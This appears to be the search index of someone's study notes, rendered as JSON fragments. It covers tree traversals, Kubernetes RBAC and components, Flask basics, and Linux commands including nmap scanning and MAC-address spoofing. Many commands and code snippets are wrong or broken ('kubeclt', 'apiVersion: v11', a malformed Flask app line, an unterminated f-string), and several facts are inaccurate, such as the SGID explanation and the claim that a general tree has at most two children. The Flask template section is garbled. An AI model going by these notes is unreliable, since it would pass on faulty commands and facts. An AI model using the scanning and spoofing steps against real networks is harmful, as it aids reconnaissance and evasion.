1</p>"},{"location":"docs/Algorithms/traversals/#depth-first-search-ways-to-try-a-visit-every-single-node","title":"Depth first search - Ways to try a visit every single node","text":"<pre><code>- **Pre order**\n    - U first visit the node then i do the recursion \n    - ==root at the begining==\n- **In odrder** \n    - We recurse to the last elemnt of the tree side then add the middle point and recurse left\n    - ==root at the middle==\n- **Postorder** we do recursion then we visit the  node \n    - *post order is good to clear the data on a way out*\n    - ==root at the end==\n\n$$2$$\n</code></pre>"},{"location":"docs/Algorithms/traversals/#breadth-first-seatch","title":"Breadth first seatch","text":"<p>Oposite of a depth first search - We use queue_algorithms instead of stack_algorithms - Its a tree level visiting One tree level at a time  &gt;[!quote] trees_algorithms</p>"},{"location":"docs/Algorithms/trees_algorithms/","title":"trees algorithms","text":""},{"location":"docs/Algorithms/trees_algorithms/#trees","title":"Trees","text":"<p>All roads leads to trees Terminology - Root - The most parent node (the first Adam) - Height - The lognest path from root to the most child node - Binary tree - A tree in which has at most 2 children - It ussual has lef and right as a name for the children - General tree - A tree in which has at most 2 children - Binary search-tree - Specyfic ordering - A tree in which has at most 2 children - Leavs - node without the children - Balanced - A tree is ==perfecly balacned== when any node\u2019s lef and right children have the same height - The more balanced the better the algorithm - Branching Factor - The amount of children a tree has</p> <p>A B</p> <p>[!quote] quick sort</p>"},{"location":"docs/CKA/CRI/","title":"CRI","text":"<p>The way kublet interacts with the <code>container runtimes</code> * It communicates via 2 services using  <code>gRPC</code>      * RuntimeService         * Menages the lifecycle of podman and continers         * Handles actions like creating, starting, stopping, and deleting containers.     * ImageService         * Manages container images.         * Handles actions like pulling, listing, and removing images.</p>"},{"location":"docs/CKA/Contorl_Plane_kubenretes/","title":"Contorl Plane kubenretes","text":"<p>Maneges worker nodes and pods in the cluster</p> <p>[!example] </p>"},{"location":"docs/CKA/Contorl_Plane_kubenretes/#kube-apiserver-front-end-of-the-control-plane-exposing","title":"Kube-apiserver - Front end of the control plane - **Exposing","text":"<p>Kubernetes API**</p>"},{"location":"docs/CKA/Contorl_Plane_kubenretes/#etcd","title":"Etcd","text":"<ul> <li>Key/value store of the current state of the cluster</li> </ul>"},{"location":"docs/CKA/Contorl_Plane_kubenretes/#cloud-controller-manager","title":"Cloud-controller-manager","text":"<ul> <li>Communicates between the cluster and cloud Api</li> </ul>"},{"location":"docs/CKA/Kubernetes/","title":"Kubernetes","text":""},{"location":"docs/CKA/Kubernetes/#benefits","title":"Benefits","text":"<ul> <li>Availability and scalability<ul> <li>Load balancing<ul> <li>It can duplicate the applicatipn  </li> </ul> </li> </ul> </li> <li>Portable<ul> <li>can run anywhere on any type of the infrastructure</li> </ul> </li> <li>Popularity</li> </ul>"},{"location":"docs/CKA/Kubernetes/#cluster-architecture","title":"Cluster Architecture","text":"<p><code>Lifecycles</code> of pods and kube service are not connected !</p>"},{"location":"docs/CKA/Kubernetes/#rbac-cluster","title":"RBAC cluster","text":""},{"location":"docs/CKA/Kubernetes/#config-map","title":"Config map","text":"<p>External configuration of u'r application</p> <p>Get all config maps in the deployments <pre><code>kubeclt get cm\n# Output:\n# index-html-blue        1      20s\n# index-html-yellow-v2   1      20s\n# kube-root-ca.crt       1      28d\n</code></pre></p>"},{"location":"docs/CKA/Kubernetes/#nodes","title":"Nodes","text":""},{"location":"docs/CKA/Kubernetes/#master-nodes","title":"Master Nodes","text":"<p>Always run this four processes * <code>API server</code>  * <code>Scheduler</code>(it calls kubectl)     * wehre to put the pod  * <code>Controler manager</code>(calls the <code>scheduler</code>)     *  Detecting the state changes  * <code>etcd</code>(a cluster brain)     * Baisicly it holds the entire data of the cluster state     * cluster changes are saved in a key-value store         *  only <code>application data</code> is not stored in etcd </p>"},{"location":"docs/CKA/Kubernetes/#worker-node","title":"Worker node","text":"<ul> <li>Has  mulitple pods running </li> <li>Has those 3 components always installed<ul> <li>Container runtime </li> <li>Kubelet (scheduling the containers)</li> <li>Kube Proxy</li> </ul> </li> </ul>"},{"location":"docs/CKA/Kubernetes/#node_k","title":"node_k","text":"<ul> <li>pshyhical virtual machine<ul> <li>runs one or more pod</li> </ul> </li> </ul>"},{"location":"docs/CKA/Kubernetes/#diffrent-tools","title":"Diffrent tools","text":"<ul> <li>WareWolf</li> </ul>"},{"location":"docs/CKA/RBAC_cluster/","title":"Culster RBAC","text":"<p>Kube Docs RBAC</p> <p>Killercoda Lab</p>"},{"location":"docs/CKA/RBAC_cluster/#buidlidng-blocks","title":"Buidlidng Blocks","text":"<ul> <li><code>Subject</code></li> <li>The user or process that want to access a resource</li> <li><code>Resource</code><ul> <li>The kubernetes API resource type (ex. Depoloyment or node)</li> </ul> </li> <li><code>Verb</code> <ul> <li>The operation that can be executed on the resource (creating a pod or delete the service)</li> </ul> </li> </ul>"},{"location":"docs/CKA/RBAC_cluster/#namespaces","title":"Namespaces","text":"<p>By default kubernetes provides 4 namescpaes  * <code>kube-system</code>     * Do not create or modyfie in here !!!     * System processes      * Master and kubectl processes  * <code>kube-public</code>     * Publicly avaiable data     * Config Map  * <code>kube-node-lease</code>     * hearbeats of nodes     * each node has associated <code>lease object</code> in namespace     * determines the availability of a node * <code>deufalt</code>     * resource u create are stored here</p> <p>Namespaces can be created with the config files <pre><code>apiVersion: v11\nkind: ConfigMap\nmetadata:\n    name: mysql-configmap \n    namesapce: my-namespace\ndata: \n    db_url: mysql-service.database\n</code></pre> **Example to get nampespaces <pre><code>kubectl get namescpaes\n# Output:\n# NAME                 STATUS   AGE\n# default              Active   46h\n# kube-node-lease      Active   46h\n# kube-public          Active   46h\n# kube-system          Active   46h\n</code></pre></p>"},{"location":"docs/CKA/RBAC_cluster/#rbac-resources","title":"RBAC resources","text":"<p>(so it\u2019s just binding resources to the any grups)</p> <ul> <li><code>ClusterRole|Role</code><ul> <li>defines a set of permissions and where it is available<ul> <li>in the whole <code>cluster</code> or just a single <code>Namespace</code>.</li> </ul> </li> </ul> </li> <li><code>ClusterRoleBinding|RoleBinding</code><ul> <li>connects a set of permissions with an account and defines     where it is applied,<ul> <li>in the whole <code>cluster</code> or just a single <code>Namespace</code>.</li> </ul> </li> </ul> </li> </ul> <p>Because of this there are 4 different <code>RBAC</code> combinations and 3 valid</p> <p>Kube Namespaces</p> <p>Baiscly if the cluster doesnt know about it (single namespace) then it can\u2019t execute it</p> <ul> <li> <p>Role + RoleBinding</p> <ul> <li>(available in single Namespace, applied in single Namespace)</li> </ul> </li> <li> <p>ClusterRole + ClusterRoleBinding</p> <ul> <li>(available cluster-wide, applied cluster-wide)</li> </ul> </li> <li> <p>ClusterRole + RoleBinding</p> <ul> <li>(available cluster-wide, applied in single Namespace)</li> </ul> </li> <li> <p>Role + ClusterRoleBinding</p> <ul> <li>(NOT POSSIBLE: available in single Namespace, applied     cluster-wide)</li> </ul> </li> </ul> <p>Create and bind resources<code>k create &lt;resource&gt; &lt;target&gt;</code></p> <pre><code>k create systemaccount test -n node1 -n node2 \n</code></pre> <p>**Crete a role smoke in applaication  ns that can create deled against pods,deployments <pre><code>k -n applications create role smoke --verb create,delete --resource pods,deployments,sts\n</code></pre></p>"},{"location":"docs/CKA/RBAC_cluster/#nodes-and-there-roles","title":"Nodes and there roles","text":"<p>get the information about the particular role <code>k get clusterrole</code></p> <pre><code> kubectl get clusterrole view\n\n# Output\n# NAME   CREATED AT\n# view   2024-10-07T10:20:53Z\n</code></pre>"},{"location":"docs/CKA/RBAC_cluster/#describing-ther-roles","title":"Describing ther roles","text":"<p>Get information what the role can ascess <code>k describe clusterrole</code></p> <pre><code>kubectl describe clusterrole view \n# Output: \n# daemonsets.apps/status                       []                 []              [get list watch]\n# daemonsets.apps                              []                 []              [get list watch]\n# deployments.apps/scale                       []                 []              [get list watch]\n</code></pre>"},{"location":"docs/CKA/RBAC_cluster/#can-i-tho","title":"Can i tho ?","text":"<p>Tells if u have permissions to perform the action <code>kubeclt auth can-i</code></p> <pre><code>kubeclt auth can-i delete deployments --as system:serviceaccount:ns1:pipeline -n ns1\n# Output:\n# No\n</code></pre>"},{"location":"docs/CKA/RBAC_cluster/#namespaces_1","title":"Namespaces","text":"<p>Everything in kubernetes can talk to evrything Depends on the proxymity &gt; When the resources are in the <code>same namespace</code> they can see each other: direcly</p> <p><code>kubeclt get</code> to acceess all namespaces</p> <pre><code> kubectl get namespaces \n\n # Output:\n # NAME                 STATUS   AGE\n # default              Active   21d\n # kube-node-lease      Active   21d\n # kube-public          Active   21d\n # kube-system          Active   21d\n # local-path-storage   Active   21d\n # ns1                  Active   53s\n # ns2                  Active   53s\n # controlplane $ \n</code></pre>"},{"location":"docs/CKA/RBAC_cluster/#creating-cluster-roles","title":"Creating Cluster Roles","text":"<p>Example creating a cluster role <pre><code>kubectl -n applications create role smoke \\\n  --verb=create,delete \\\n  --resource=pods,deployments,statefulsets\n\n# Output: \n# role.rbac.authorization.k8s.io/smoke created\n</code></pre></p>"},{"location":"docs/CKA/RBAC_cluster/#service-accounts","title":"Service accounts","text":"<p>Upon object creation, the API server creates a Secret holding the API token and assigns it to the ServiceAccount.</p> <p>Exaple disoviering SericeAccount  secrets <pre><code> kubectl get secrets\n\n# Output:\n# NAME                          TYPE                                  DATA   AGE\n# build-bot-token-rvjnz         kubernetes.io/service-account-token   3      20m\n# default-token-qgh5n           kubernetes.io/service-account-token   3      93d\n</code></pre></p> <p>Namespaces Kubernetes</p>"},{"location":"docs/CKA/crictl/","title":"Crictl","text":"<p>Interact with CRI-Compliant Runtimes:</p>"},{"location":"docs/CKA/helm/","title":"Helm","text":"<p>It's baiscly templating engine and pkg manager combined</p>"},{"location":"docs/CKA/helm/#helm-charts","title":"Helm Charts","text":"<ul> <li>Bundle of YAML Files<ul> <li>Create your own Helm Charts with Helm</li> <li>Push them to Helm Repository</li> </ul> </li> </ul> <p>Example values.yml <pre><code>imageName: myapp;\nport: 8080\nversion: 1.0.0\n</code></pre></p>"},{"location":"docs/CKA/helm/#the-helm-2-vs-helm-3","title":"The Helm 2 vs Helm 3","text":"<ul> <li>With triller<ul> <li>The <code>Triller</code> client  is managing the releases </li> <li>Changes are appliaed to the exisisting deployment instead of createing a new one<ul> <li>Handling rollbacks</li> </ul> </li> <li>It Has too much power</li> </ul> </li> <li>Helm 3 is without the Trialler</li> </ul>"},{"location":"docs/CKA/kube_deployments/","title":"Kube Deployments","text":""},{"location":"docs/CKA/kube_deployments/#deployments-adn-statefulsets","title":"Deployments  adn StateFulSets","text":"<p>Blueprint for pods * Deployments     * You create ddeployments not individual pods  * StateFulSets</p> <p>DB Can't be replicated via Deployments!!(because of state) * Menages the <code>replica set</code></p> <p>get all the blueprints for the pods <pre><code> kubectl get replicaset\n # Output:\n # NAME                    DESIRED   CURRENT   READY   AGE\n # nginx-depl-5796b5c499   1         1         1       41m\n</code></pre></p> <ul> <li>pods</li> <li>kubectl</li> <li>kube service</li> <li>Kubernetes</li> </ul>"},{"location":"docs/CKA/kube_ingress/","title":"Kube Ingress","text":"<p>You need an implementation for the ingress <code>Ingress Controler</code>(many third party implementations) - Example <code>K8s Nginx Ingress controler</code></p> <ul> <li>evaluates and processes ingres rules<ul> <li>menages redirections</li> <li>entrypoint ot  cluster</li> </ul> </li> </ul> <p></p>"},{"location":"docs/CKA/kube_logs/","title":"Kube Logs","text":"<ul> <li>Log Locations<ul> <li>/var/log/pods</li> <li>/var/log/containers</li> <li>crictl ps + crictl logs</li> <li>docker ps + docker logs (in case when Docker is used)</li> <li>kubelet logs: /var/log/syslog or journalctl</li> </ul> </li> </ul> <p>Example checking for the misconfigured <code>kube-apiserver</code> <pre><code>cat /var/log/syslog | grep kube-apiserver\n# Becauce -p err doesnt work u have to filter mannualy \n# E1129 Means the Error and the date  29  November\njournalctl -u kublet.service  --since \"1h ago\" | grep -E \"err=\" \n# Output:\n# Nov 29 10:58:26 controlplane kubelet[734]: E1129 10:58:26.033507734 run.go:72] \"command failed\" err=\"failed to run Kubelet: validate service connection: validate CRI v1 runtime API for endpoint \\\"unix:///run/containerd/containerd.sock\\\": rpc error: code = Unknown desc = server is not initialized yet\"\n</code></pre></p> <ul> <li>Trubleshooting Api-server   A lot of the times the issue is with the missconfigured etcd flag or netwroking   Just verify the ETCD port in the <code>etcd.yaml</code> manifest (<code>--listen-client-urls</code> and <code>--advertise-client-urls</code>).</li> </ul>"},{"location":"docs/CKA/kube_secret/","title":"Kube Secret","text":"<p>Example Secret configuration file <pre><code>- kind: secret\n- metadata/name:\n- type: \"Opaque the defult type\"\n- data: \"The accrualt conntents of the secret\"\n</code></pre></p>"},{"location":"docs/CKA/kube_service/","title":"Kube Service","text":"<ul> <li>Permanent ip Address </li> <li> <p>Acts as a <code>load balancer</code></p> </li> <li> <p>kube ingress  A service taht manges the  routing external HTTP/S traffic to services within the cluster.</p> </li> <li>External service smth that connect to the outside world </li> <li>Internal service  smth that only see inside the cluster (database)</li> </ul> <p>pods kubectl Kubernetes()</p>"},{"location":"docs/CKA/kube_volumes/","title":"Kube Volumes","text":"<ul> <li>Static Provisioning <ul> <li>You need a specyfic control over the storage</li> </ul> </li> <li>Dynamic  Provisioning <ul> <li>Kubernetes will do it automatically using <code>StorageClass</code></li> </ul> </li> </ul> <p>Example geting the default <code>StorageClass</code> <pre><code>kubectl get storageclass\n# Output:\n# NAME                   PROVISIONER             RECLAIMPOLICY   VOLUMEBINDINGMODE      ALLOWVOLUMEEXPANSION   AGE\n# local-path (default)   rancher.io/local-path   Delete          WaitForFirstConsumer   false                  22d\n</code></pre></p>"},{"location":"docs/CKA/kubectl/","title":"Kubectl","text":""},{"location":"docs/CKA/kubectl/#list-all-the-servies","title":"List all the servies","text":"<p>Installation Docs</p> <pre><code>kubectl api-resources\n</code></pre> <p>Namespaces</p>"},{"location":"docs/CKA/pods/","title":"Pod","text":"<ul> <li>The smallest deploy-able unit<ul> <li>Usually one app per pod</li> <li>Group of one or more container<ul> <li>They share storage and network resources (RBAC     cluster)</li> <li>Each pod gets it\u2019s own local ip</li> </ul> </li> </ul> </li> <li>Unit of replication<ul> <li>Easy to increase the number of pods running</li> </ul> </li> </ul>"},{"location":"docs/CKA/pods/#pods-kinds","title":"Pods kinds","text":""},{"location":"docs/CKA/pods/#sidecar","title":"Sidecar","text":"<ul> <li> <p>Run in the same Pod as main container</p> </li> <li> <p>Can share folders with main container</p> </li> <li> <p>Can communicate via localhost     </p> </li> </ul>"},{"location":"docs/CKA/pods/#ambassador","title":"Ambassador","text":"<ul> <li> <p>The main app does not connect to external services</p> <ul> <li>The ambassador container does it</li> <li>It works pretty much as proxy</li> </ul> </li> </ul> <p></p>"},{"location":"docs/CKA/pods/#adapter","title":"Adapter","text":"<ul> <li>This modifies the information revived from the container to the     desired format<ul> <li>Example logs or data required for the app</li> </ul> </li> </ul> <p>docks</p> <ul> <li>kubectl</li> <li>kube service</li> <li>kube deployments</li> <li>Kubernetes</li> </ul>"},{"location":"docs/Flask_startup/Flask_MAIN/","title":"Flask MAIN","text":""},{"location":"docs/Flask_startup/Flask_MAIN/#startup","title":"Startup","text":"<ul> <li>U have to import particular modules<ol> <li>Flask</li> <li>redirect</li> <li>url_for</li> </ol> </li> <li>Baisici startup syntax</li> </ul> <pre><code>app: Flask (__name__)\n\n@app.route(\"/\")\n\ndef home ():\n\nreturn \"This is the Main Page \"\nif __name__ == \"__main__\":\n\napp.run()\n</code></pre> <ul> <li>Every page is defined by the function</li> </ul> <pre><code> @app.route(\"/admin\")\ndef admin ():\n    return \"This is the Admin  Page\"\n</code></pre> <ul> <li>To make sthings easier use duble slaches<ul> <li>Example /about/ ### Redirect</li> </ul> </li> <li>The simples is use redirect method</li> </ul> <pre><code>@app.route(\"/admin\")\ndef admin ():\n    return redirect(url_for(\"home\"))\n</code></pre> <p>This will redirect a person from admin to home - Theres also an optionm to redirect someone to the commucniate</p> <pre><code>@app.route(\"/&lt;name&gt;\")\ndef about (name):\n    return f\"Hello {name}!\n</code></pre> <p>This will print the varaible inserted into search u only has to put in html format</p>"},{"location":"docs/Flask_startup/Flask_MAIN/#python-code-in-html","title":"Python code in html","text":"<ul> <li> <p>This allows us to write semi native python code</p> <ul> <li>To refrence smth use **{{name of variable</li> </ul> <pre><code>{% for i in range (10)  %}\np&gt; Hello &lt;p\n{% endfor %}\n# This treats it as variable \n{% {x} %}\n{%if x !=2 %}\n{%endif %}\n</code></pre> </li> </ul>"},{"location":"docs/Flask_startup/Flask_MAIN/#template-inharientence","title":"Template Inharientence","text":"<ul> <li> <p>U can inheraite tampletes by code blox u just use { % block name     %} {% endblock %}</p> <ul> <li>To extend the template u just use {% extends \u201cbase.html\u201d %}     ``` \\&lt;!DOCTYPE html&gt;      <p>{% endblock %}</p> <p> <p>{% block content %}</p> <p>{% endblock %}</p> <p> </p> <p>``` ## JS and Css - Java script and css file should be located in a static folder and linked by the url similarly to the icons -  - {{ url_for(\u2018static\u2019, filename: \u201ccss/box.css\u201d) }}</p>"},{"location":"docs/Linux/Device_types/","title":"Device types","text":""},{"location":"docs/Linux/Device_types/#device-types","title":"Device types","text":""},{"location":"docs/Linux/Device_types/#character-devices","title":"Character devices","text":"<p>Ussualy represented by c Thsis are external deviciese interantiing such as mice or kyboard ### Block Devices Represented by B To see the lsi of devices use lsblk Short for lsit block u can also use fdisk -l</p>"},{"location":"docs/Linux/Device_types/#disk-free","title":"Disk Free","text":"<p>command df</p> <p>[!quote] fsck Block vs character dev</p>"},{"location":"docs/Linux/Permissions/","title":"Permissions","text":"<p>Permissions are written in 3 sections. 1. for the user 2. for the group 3. for all users</p>"},{"location":"docs/Linux/Permissions/#adding-permissions-in-binary","title":"Adding Permissions in Binary","text":"<p>To add all permissions to all users, you need to type <code>777</code>.</p> <p>Example</p> <p>Numeric representation of permissions </p> <p>umask</p>"},{"location":"docs/Linux/Permissions/#special-permissions","title":"Special Permissions","text":"<ul> <li>SUID</li> <li>SGID</li> </ul> <p>skel_etc</p>"},{"location":"docs/Linux/SGID/","title":"SGID","text":""},{"location":"docs/Linux/SGID/#grants-the-permmison-to-the-group","title":"Grants the permmison to the group","text":"<p>The SGID bit is represented as 2 before the regular permissions &gt;[!example] The SGID bit is represented as 2 before the regular permissions</p> <p>new file with the resulting permissions 644 would be represented as 2644 when the SGID bit is set. Again, you would use the chmod command for this\u2014for example, chmod 2644 filename. ## To a file This means that, with an SGID bit set, someone without execute permission can execute a file if the owner belongs to the group that has permission to execute that file ## To directory Ownership of new files created in that directorygoes to the directory creator\u2019s group, rather than the file creator\u2019s group. - This is very useful when a directory is shared by multiple users. All users in that group can execute the file(s), not just a single user.</p>"},{"location":"docs/Linux/SUID/","title":"SUID","text":""},{"location":"docs/Linux/SUID/#granting-temporary-root-permissions-with-suid","title":"Granting Temporary Root Permissions with SUID","text":"<p>The s instead of h rperesnts that file is in SUID mode - Any user can exexute the file iwt he permios of the owner bu those permissions dont extend beyond the use of that file &gt;[!example] To set the SUID bit, enter a 4 before the regular permissions &gt;you want to do so, you\u2019ll use the chmod command, as in chmod 4644 filename.</p> <p>[!quote] [[userID]] SGID UUID</p>"},{"location":"docs/Linux/Virtual_Env/","title":"Virtual Env","text":""},{"location":"docs/Linux/Virtual_Env/#venv","title":"venv","text":""},{"location":"docs/Linux/Virtual_Env/#create","title":"Create","text":"<ul> <li>python -m venv /path/to/new/virtual/environment<ul> <li>-m module-name Searches sys.path for the named module and runs     the corresponding .py file as a script. This termi\u2010 nates the     option list (following options are passed as arguments to the     module).</li> </ul> </li> </ul>"},{"location":"docs/Linux/Virtual_Env/#activate","title":"activate","text":"<p>source venv/bin/activate</p>"},{"location":"docs/Linux/Virtual_Env/#deactivate","title":"Deactivate","text":"<p>Hust type deactivate</p> <p>[!quote] docker</p>"},{"location":"docs/Linux/dd/","title":"dd","text":""},{"location":"docs/Linux/dd/#copy-bit-to-bit","title":"Copy bit to bit","text":"<p>dd if: inputfile of=outputfile</p> <p>example</p> <pre><code>dd if=/dev/sdb of=/root/flashcopy\n1257441: 0 records in\n1257440+0 records out\n7643809280 bytes (7.6 GB) copied, 1220.729 s, 5.2 MB/s\n</code></pre> <p>tar devnull</p>"},{"location":"docs/Linux/env/","title":"env","text":""},{"location":"docs/Linux/env/#env","title":"Env","text":"<ul> <li>Env allows to list Envariomental Variables<ul> <li>To see all use set &gt;[!example] Changing the env     Variables &gt;HISTSIZE: 1000</li> </ul> </li> </ul> <p>To make changes permanent use export</p> <p>[!quote]</p>"},{"location":"docs/Linux/fsck/","title":"fsck","text":""},{"location":"docs/Linux/fsck/#check-errors-on-the-flash-drive","title":"Check errors on the flash drive","text":"<p><code>- p</code> means autoamticly repair</p> <p>e2fsck</p> <p>File system Commands</p>"},{"location":"docs/Linux/golden_image/","title":"Golden image","text":"<p>System that we use to deploy all other system from - Harden to the seciurity standards (<code>GRC</code> (Governance, Risk, and Compliance) ) - All defualt accounts either disabled or remved if not used - All defautl passwords changed - Seciurity benchmarks (CIS STIG OpenSCAP) - Softwere - Updated/Patched - Only there if needed - Only running if needed - <code>HIDS</code>(Host intrusion detection system) - Aws HIDS Aritcle - Tripwire - Fail2ban - Good Loging system - Loki - Syslog running - Host level firewals - Connection cannot happen by root</p>"},{"location":"docs/Linux/hardlink/","title":"Hardlink","text":"<p>It\u2019s a pointer to an inode - It shares the same inode</p> <p>Is\u2019s relly hard to delte it!!!</p>"},{"location":"docs/Linux/hardlink/#unix-mechanism-of-the-storage","title":"Unix mechanism of the storage","text":"<p>Since the file sharse the same indode</p> <p>u can\u2019t get rid of the program unlles u remove of all the inodes</p>"},{"location":"docs/Linux/hardlink/#how-to-find-the-hardlink","title":"How to find the hardLink","text":"<p><code>ls -i</code> Displays the 2 files that share the same inode</p> <pre><code>ls -li \n\n# Output:  \n# total 2\n# 416812020 -rw-r--r--. 2 aura aura 1679 Oct 27 13:00 main.go\n# 416812020 -rw-r--r--. 2 aura aura 1679 Oct 27 13:00 test\n</code></pre> <p>stat will dsipaly the number fo links is greater then one</p> <pre><code>stat hardlink.txt\n# Output:\n# File: test\n# Size: 1679            Blocks: 8          IO Block: 4096   regular file\n# Device: fd06h/64774d    Inode: 416812020   Links: 2\n# Access: (0644/-rw-r--r--)  Uid: ( 1000/    aura)   Gid: ( 1000/    aura)\n# Context: unconfined_u:object_r:user_home_t:s0\n</code></pre> <p>find <code>--samefile</code> find the same files based on the inodes</p> <pre><code>ls\n#Output:\n# junk  orignalfile     hardlink\n\nfind -samefile test\n# Output:\n#./orignalfile\n#./hardlink\n</code></pre>"},{"location":"docs/Linux/hardlink/#check-when-deleting-the-log-files-the-same-situation-my-appear-when-it","title":"CHECK when deleting the log files The same situation my appear when it","text":"<p>comes to the logrotate</p>"},{"location":"docs/Linux/kill/","title":"kill","text":""},{"location":"docs/Linux/kill/#kill","title":"Kill","text":"<p>If you don\u2019t provide a signal flag, it defaults to SIGTERM Syntax kill -numer of flag PID &gt;[!tip] Commonly used kill signals &gt;</p> <p>Ofc u can kill processes using top</p> <p>[!quote]</p>"},{"location":"docs/Linux/nice/","title":"nice","text":""},{"location":"docs/Linux/nice/#nice","title":"Nice","text":"<p>The nice command is used to influance the priority of procces to the kernel (the kernel has a final say) - The more u\u2019re nice to other users the lower the priority - The values for nice range from (-20 to +19)  &gt;[!Example] To speed up slow procces &gt;The \u201cn\u201d value determines the priority level &gt;kali &gt;nice -n 10 /bin/slowprocess</p> <p>[!quote] renice | processes_kernel | ps</p>"},{"location":"docs/Linux/nmap/","title":"nmap","text":"<ul> <li>By default, Nmap scans 1000 ports.<ul> <li>You can scan multiple sites in one scan.<ul> <li>You can also scan both the site and the particular     IP.</li> </ul> </li> </ul> </li> <li>You can easily get the IP and address of the site.<ul> <li>Then check the location using this     tool.</li> <li>You can also check it by typing whois 45.33.32.156 in the     browser.</li> </ul> </li> <li>Nmap provides a test site: http://scanme.nmap.org.<ul> <li>Remember to use <code>-oG</code> to save the file in a     grepable format.</li> </ul> </li> </ul>"},{"location":"docs/Linux/nmap/#tcp-scan","title":"TCP Scan","text":"<p>Example:</p> <pre><code>nmap -sT 192.168.181.1\n</code></pre> <p>For MySQL:</p> <pre><code>nmap -sT 192.168.181.1 -p 3306\n</code></pre>"},{"location":"docs/Linux/nmap/#fast-scan","title":"Fast Scan","text":"<ul> <li>nmap -F: Gives the list of the most targetable ports.<ul> <li>By default, it scans only 100 ports.</li> </ul> </li> <li>nmap \u2013open: Searches only for the open ports.</li> </ul>"},{"location":"docs/Linux/nmap/#aggressive-scan","title":"Aggressive Scan","text":"<ul> <li>nmap -A: Looks for the operating system and other services.</li> <li>nmap -sV: Gives you the version of the operating system. Useful     to target     Exploits_metasploit     for this system version.</li> </ul>"},{"location":"docs/Linux/nmap/#nmap-for-speed","title":"Nmap for Speed","text":"<ul> <li>nmap -T (1-5): Sets the speed of the command.</li> <li>nmap -Pn: Skips the pinging.</li> </ul>"},{"location":"docs/Linux/nmap/#related-posts","title":"Related Posts","text":"<ul> <li>Network Scanning</li> <li>Port Scanning</li> <li>ifconfig</li> <li>nslookup</li> </ul>"},{"location":"docs/Linux/nslookup/","title":"Name server lookup","text":"<p>Used to query DNS to get inforamtion about domain names such as Ip or other records &gt;Type nslookup followed by the domain name you want to query (e.g., nslookup example.com). ## Two Modes ### Interactive In interactive mode, you can enter commands and receive immediate feedback ### Non-interactive in non-interactive mode, you can specify a command and receive output without entering the interactive mode.</p> <p>dig nmap</p> <p>DNS</p>"},{"location":"docs/Linux/nvim/","title":"Nvim","text":""},{"location":"docs/Linux/nvim/#u-dont-need-any-file-explorer-use-expolrer","title":"U dont need any file explorer use Expolrer","text":"<ol> <li><code>mf</code> to mark the directory</li> <li><code>mx</code> to apply shell command to marked files</li> <li>rm -rf</li> </ol>"},{"location":"docs/Linux/nvim/#passing-arguments-to-the-nvim-could-be-done-by-just-appending-the-string","title":"Passing arguments to the nvim could be done by just appending the string","text":"<pre><code>v() {\n    if [ \"$#\" -eq 1 ];then # \n  if test -d \"$1\";then \n    nvim \"$HOME/$dir\" +\":cd %:p:h\" +\"Explore\"\n\n  else \n    nvim \"$1\" +':cd %:h'\n  fi\nelse \n    nvim . +\":cd %:p:h\" +\"Explore\"\nfi\n}\n</code></pre>"},{"location":"docs/Linux/proc/","title":"/proc","text":""},{"location":"docs/Linux/proc/#see-the-starter-command","title":"See the starter command","text":"<pre><code>cat /proc/cmdline\n</code></pre>"},{"location":"docs/Linux/proc/#see-the-load-avarge","title":"See the load avarge","text":"<pre><code>cat /proc/loadavg\n</code></pre>"},{"location":"docs/Linux/proc/#get-the-info-of-the-processor","title":"Get the info of the processor","text":"<pre><code>cat /proc/\n</code></pre>"},{"location":"docs/Linux/proc/#memory-consumtion","title":"Memory consumtion","text":"<p>Get the actual info of how many mem the procces consumes</p> <pre><code>cat /proc/1234/smaps\n</code></pre> <p>In recent versions of Linux, use the smaps subsystem.</p> <p>For example, for a process with a PID of 1234</p> <pre><code>cat /proc/1234/smaps\n</code></pre> <p>It will tell you exactly how much memory it is using at that time.</p> <p>More importantly, it will divide the memory into <code>private</code> and <code>shared</code>, so you can tell how much memory your instance of the program is using,</p> <p>without including memory shared between multiple instances of the program.</p> <p>You can use awk to add up all the PSS entries:</p> <pre><code>awk '/^Pss:/ {pss+=$2} END {print pss}' &lt; /proc/1234/smaps \n</code></pre>"},{"location":"docs/Linux/renice/","title":"renice","text":""},{"location":"docs/Linux/renice/#renice","title":"Renice","text":"<ul> <li>Sets the priority to the particular level<ul> <li>Takes values between -20 and 19</li> <li>Requiaer PID<ul> <li>Only root can increase priority but evry user can decrese     the priority</li> </ul> </li> </ul> </li> </ul> <p>[!quote] nice kill</p>"},{"location":"docs/Linux/sar/","title":"sar","text":""},{"location":"docs/Linux/sar/#sar-collect-report-or-save-system-activity-information","title":"sar - Collect, report, or save system activity information.","text":"<p>Checking the kio stat</p> <p>Check the interfaces  <pre><code>sar -n DEV 1 1\n# For wide output\nvmstat  -w \n</code></pre></p> <p>Docs</p>"},{"location":"docs/Linux/service/","title":"service","text":""},{"location":"docs/Linux/service/#service","title":"service","text":"<p>An application that runs in the background waiting for you to use it</p>"},{"location":"docs/Linux/service/#stops-the-system-demon-syntax-service-servicename","title":"Stops the system demon - Syntax - service servicename","text":"<p>start|stop|restart</p> <p>[!quote] ps top</p>"},{"location":"docs/Linux/shell/","title":"shell","text":""},{"location":"docs/Linux/shell/#shell","title":"Shell","text":""},{"location":"docs/Linux/shell/#etc-the-shells-installed-on-the-device-are-at-etcshells-u-can","title":"etc - The shells installed on the device are at etc/shells - u can","text":"<p>check them using cat etc/shells</p> <ul> <li>Change the defult shell<ul> <li> <p>chsh -s $(which zsh)</p> <ul> <li>if u add sudo it will change the shell for rooot user</li> <li>Check the runing shell<ul> <li>*ps -p \u2005*\u2005\u2212 \u201d indicates the process id of the current instance of the shell you are running</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>[!quote] ps | Baisic Linux commands</p>"},{"location":"docs/Linux/spoof/","title":"spoof","text":""},{"location":"docs/Linux/spoof/#spoofing","title":"Spoofing","text":"<p>Changing mac adress to appppear as a diffrent device U just need to make the hardwere down ifconfig and cahnge the mac adrees with hr</p> <p>example</p> <pre><code>ifconfig eth0 down\nifconfig eth0 hw ether 00:11:22:33:44:55\nifconfig eth0 up\n</code></pre> <p>ifconfig iwconfig</p>"},{"location":"docs/Linux/sudo/","title":"sudo","text":"<p>Get hold of permission  of the user <pre><code>sudo -l -U &lt;user&gt;\n# Output: \n# [sudo] password for aura:\n# Matching Defaults entries for aura on nixos:\n#     env_keep+=TERMINFO_DIRS, env_keep+=TERMINFO\n#\n# User aura may run the following commands on nixos:\n#     (ALL : ALL) SETENV: ALL\n</code></pre></p> <ul> <li>The defualt is stored in <code>/etc/sudoers</code><ul> <li>But don't edit this direcly use <code>/etc/sudoers.d/</code></li> 